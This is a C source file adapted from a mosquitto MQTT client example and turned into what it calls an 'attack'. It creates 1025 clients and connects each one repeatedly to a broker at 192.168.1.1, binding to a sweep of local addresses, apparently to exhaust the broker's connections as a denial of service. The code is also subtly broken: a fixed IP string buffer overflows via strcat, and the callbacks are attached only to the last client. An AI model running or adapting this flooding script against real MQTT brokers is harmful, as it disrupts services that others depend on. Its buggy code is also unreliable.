#include <stdio.h>
#include "stdlib.h"
#include "string.h"
#include "unistd.h"
#include <mosquitto.h>




// TODO: make command adjustable with options and stuff
/*void parse_parameters(char *argv[]) {
    int length = sizeof(argv) / sizeof(argv[0]);
    int port;
    port = 1883;
    int keepAlive;
    keepAlive = 60;

    // no parameters
    if (length == 1) {
        printf("Usage: main.c -h [host address] -p [broker port] -k [keep alive]\n");
    }
}*/

void on_connect(struct mosquitto *mosq, void *obj, int reason_code) {

    int rc;
    printf("on_connect: %s\n", mosquitto_connack_string(reason_code));
    if (reason_code != 0) {
        /* If the connection fails for any reason, we don't want to keep on
         * retrying in this example, so disconnect. Without this, the client
         * will attempt to reconnect. */
        mosquitto_disconnect(mosq);
    }
    rc = mosquitto_subscribe(mosq, NULL, "test", 1);
    if (rc != MOSQ_ERR_SUCCESS) {
        fprintf(stderr, "Error subscribing: %s\n", mosquitto_strerror(rc));
        /* We might as well disconnect if we were unable to subscribe */
        mosquitto_disconnect(mosq);
    }

}

/* Callback called when the broker sends a SUBACK in response to a SUBSCRIBE. */
void on_subscribe(struct mosquitto *mosq, void *obj, int mid, int qos_count, const int *granted_qos) {
    int i;
    bool have_subscription = false;

    /* In this example we only subscribe to a single topic at once, but a
     * SUBSCRIBE can contain many topics at once, so this is one way to check
     * them all. */
    for (i = 0; i < qos_count; i++) {
        printf("on_subscribe: %d:granted qos = %d\n", i, granted_qos[i]);
        if (granted_qos[i] <= 2) {
            have_subscription = true;
        }
    }
    if (have_subscription == false) {
        /* The broker rejected all of our subscriptions, we know we only sent
         * the one SUBSCRIBE, so there is no point remaining connected. */
        fprintf(stderr, "Error: All subscriptions rejected.\n");
        mosquitto_disconnect(mosq);
    }
}

/* Callback called when the client receives a message. */
void on_message(struct mosquitto *mosq, void *obj, const struct mosquitto_message *msg) {
    /* This blindly prints the payload, but the payload can be anything so take care. */
    printf("%s %d %s\n", msg->topic, msg->qos, (char *) msg->payload);
}

int main(int argc, char *argv[]) {
    struct mosquitto *mosq;
    int rc;
    struct mosquitto *clients[1025];

    /* Required before calling other mosquitto functions */
    mosquitto_lib_init();

    printf("Starting the attack now ...\n");

    /* Create a new client instance.
     * id = NULL -> ask the broker to generate a client id for us
     * clean session = true -> the broker should remove old sessions when we connect
     * obj = NULL -> we aren't passing any of our private data for callbacks
     */
    int i = 0;
    // create maximum number of clients
    while (i < 1025) {
        mosq = mosquitto_new(NULL, true, NULL);
        if (mosq == NULL) {
            fprintf(stderr, "Error: Out of memory.\n");
            return 1;
        }
        clients[i] = mosq;
        i = i + 1;
    }


    /* Configure callbacks. This should be done before connecting ideally. */
    mosquitto_connect_callback_set(mosq, on_connect);
    mosquitto_subscribe_callback_set(mosq, on_subscribe);
    mosquitto_message_callback_set(mosq, on_message);

    /* Connect to test.mosquitto.org on port 1883, with a keepalive of 60 seconds.
     * This call makes the socket connection only, it does not complete the MQTT
     * CONNECT/CONNACK flow, you should use mosquitto_loop_start() or
     * mosquitto_loop_forever() for processing net traffic. */
    int j;
    int ip_addr;
    printf("Requesting connection for all clients ...\n");
    for(j=0; j<sizeof(clients)/sizeof(*clients); j++){
        for(ip_addr=2; ip_addr <=254; ip_addr++){
            // generate new IP address
            char ip_addr_end[500];
            char new_ip_addr[]= "192.168.1.";
            sprintf(ip_addr_end, "%d", ip_addr);
            strcat(new_ip_addr, ip_addr_end);
            rc = mosquitto_connect_bind(clients[j], "192.168.1.1", 1881, 60, new_ip_addr);
            //printf("IP address is %s\n", new_ip_addr);
            if (rc != MOSQ_ERR_SUCCESS) {
                mosquitto_destroy(mosq);
                fprintf(stderr, "Error: %s\n", mosquitto_strerror(rc));
                return 1;
            }
        }

    }

    /* Run the network loop in a blocking call. The only thing we do in this
     * example is to print incoming messages, so a blocking call here is fine.
     *
     * This call will continue forever, carrying automatic reconnections if
     * necessary, until the user calls mosquitto_disconnect().
     */
    mosquitto_loop_forever(mosq, -1, 1);

    mosquitto_lib_cleanup();
    return 0;
}





